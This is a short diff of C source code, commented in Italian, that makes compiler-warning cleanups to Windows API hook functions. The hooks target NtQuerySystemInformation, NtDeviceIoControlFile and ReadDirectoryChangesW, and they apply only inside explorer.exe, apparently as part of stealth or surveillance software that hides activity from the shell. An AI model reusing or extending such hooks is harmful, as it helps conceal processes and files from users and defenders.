@@ -475,7 +475,6 @@ DWORD NtQuerySystemInformationHook_setup(HMServiceStruct *pData)
 	// i processi
 	char proc_path[DLLNAMELEN];
 	char *proc_name;
-	HMODULE hMod;
 
 	ZeroMemory(proc_path, sizeof(proc_path));
 	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
@@ -483,7 +482,7 @@ DWORD NtQuerySystemInformationHook_setup(HMServiceStruct *pData)
 
 	if (proc_name) {
 		proc_name++;
-		if (!stricmp(proc_name, "explorer.exe"))
+		if (!_stricmp(proc_name, "explorer.exe"))
 			return 1;
 	} 
 //----------------
@@ -567,7 +566,6 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 										  ULONG OutputBufferLength)
 {
 	DWORD ext, dwType;
-	FileMonDevStruct * pFmEntry;
 	DWORD dwPid;
 	char *pTmp;
 	char *DestEntry;
@@ -767,7 +765,7 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 				}
 
 				// Align Entry
-				while( ((pTmp - OutputBuffer)%4) )
+				while( ((pTmp - (char *)OutputBuffer)%4) )
 					pTmp++;
 
 				// Prossimo elemento e marker di fine 
@@ -1055,8 +1053,6 @@ static BOOL WINAPI ReadDirectoryChangesWHook(HANDLE hDirectory,
 										 LPOVERLAPPED lpOverlapped,
 										 LPOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
 {
-	BOOL *Active;
-	
 	MARK_HOOK
 
 	INIT_WRAPPER(ReadDirectoryChangesWStruct)
@@ -1079,7 +1075,6 @@ static DWORD ReadDirectoryChangesWHook_setup(HMServiceStruct *pData)
 {
 	char proc_path[DLLNAMELEN];
 	char *proc_name;
-	HMODULE hMod;
 
 	// Verifica autonomamente se si tratta del processo voip
 	ZeroMemory(proc_path, sizeof(proc_path));
@@ -1087,7 +1082,7 @@ static DWORD ReadDirectoryChangesWHook_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++; 
-		if (stricmp(proc_name, "explorer.exe"))
+		if (_stricmp(proc_name, "explorer.exe"))
 			return 1; // Hooka solo explorer
 	} else
 		return 1;
